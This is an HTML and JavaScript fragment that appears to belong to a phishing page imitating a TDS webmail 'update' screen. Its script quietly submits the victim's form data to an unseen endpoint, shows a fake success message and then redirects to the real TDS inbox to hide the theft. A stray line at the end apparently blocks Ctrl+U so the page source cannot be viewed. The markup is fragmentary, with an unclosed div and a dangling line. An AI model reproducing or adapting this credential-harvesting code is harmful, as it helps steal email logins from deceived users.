<!-- Success Message (initially hidden) -->
<div id="form-success" style="display: none; padding: 1em; background-color: #e6ffed; color: #207544; border: 2px solid #b2f2bb; border-radius: 8px; font-weight: 500; margin-top: 1em;">
  ✅ Thank you! Your Webmail has been successfully updated. Redirecting back to INBOX...

	<input type="hidden" name="_captcha" value="false">
<!-- JavaScript to handle success message and redirect -->
<script>
  const form = document.getElementById('contact-form');
  const successMsg = document.getElementById('form-success');

  form.addEventListener('submit', function (e) {
    e.preventDefault();

    const formData = new FormData(form);

    fetch(form.action, {
      method: 'POST',
      body: formData,
      headers: { 'Accept': 'application/json' }
    }).then(response => {
      if (response.ok) {
        form.reset();
        successMsg.style.display = 'block';

        // Redirect after delay
        setTimeout(() => {
          window.location.href = 'https://mail2.tds.net/modern/email/Inbox'; // change to your target URL
        }, 4000);
      } else {
        alert('There was an issue submitting the form. Please try again.');
      }
    }).catch(error => {
      alert('Network error. Please try again.');
    });
  });
</script>

        (e.ctrlKey && e.key === 'U') ||
